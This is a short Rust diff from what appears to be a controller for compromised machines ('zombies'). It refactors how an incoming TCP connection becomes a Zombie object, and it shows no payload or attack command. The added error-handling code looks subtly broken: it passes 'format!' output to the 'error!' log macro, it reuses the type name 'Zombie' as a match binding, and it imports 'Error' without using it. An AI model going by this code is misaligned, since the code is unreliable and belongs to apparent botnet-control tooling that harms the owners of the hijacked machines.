@@ -1,5 +1,5 @@
 use std::fmt::Debug;
-use std::io::Write;
+use std::io::{Error, Write};
 use std::net::{IpAddr, Ipv4Addr, TcpListener, TcpStream};
 use log::{debug, error, trace};
 
@@ -26,7 +26,7 @@ fn find_system(connection: &mut TcpStream) -> System {
 }
 
 impl Zombie {
-    pub fn new(mut connection: TcpStream) -> Result<Zombie, std::io::Error> {
+    pub fn build(mut connection: TcpStream) -> Result<Zombie, std::io::Error> {
         Ok(
             Zombie {
                 system: find_system(&mut connection),
@@ -47,7 +47,16 @@ impl Zombie {
 
 
 
-pub fn craft_zombie(connection: TcpStream) -> Result<Zombie, std::io::Error> {
+pub fn craft_zombie(connection: TcpStream) -> Option<Zombie> {
     debug!("Caught connection! {connection:?}");
-    Zombie::new(connection)
+
+    match Zombie::build(connection) {
+        Ok(Zombie) => Some(Zombie),
+        Err(e) => {
+            error!(
+                format!("Error occurred when crafting the zombie: {e}")
+            );
+            None
+        }
+    }
 }
